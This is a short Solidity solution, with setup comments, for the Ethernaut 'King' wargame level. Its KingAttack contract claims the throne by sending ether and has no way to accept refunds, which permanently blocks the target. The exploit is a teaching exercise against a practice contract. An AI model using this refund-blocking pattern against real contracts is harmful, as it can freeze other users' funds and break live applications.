/*
Tools needed for this level:
- Console
- Remix IDE

1.- Obtain prize value via the console. This is the minimum value we need
    to send to King's contract to become the new king. It should be 1 Finney (0.001 ETH):
        web3.utils.fromWei((await contract.prize()).toString())

2.- Deploy this contract (KingAttack.sol) with Remix IDE using the Injected Web3
    environment, passing Ethernaut's King contract address to the constructor and
    a value equal or greater than the prize value (>= 0.001 ETH).

3.- Check if the deployed contract address became king of contract:
        await contract._king()
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
	constructor(address _king) payable {
		(_king).call{ value: msg.value }("");
	}
}
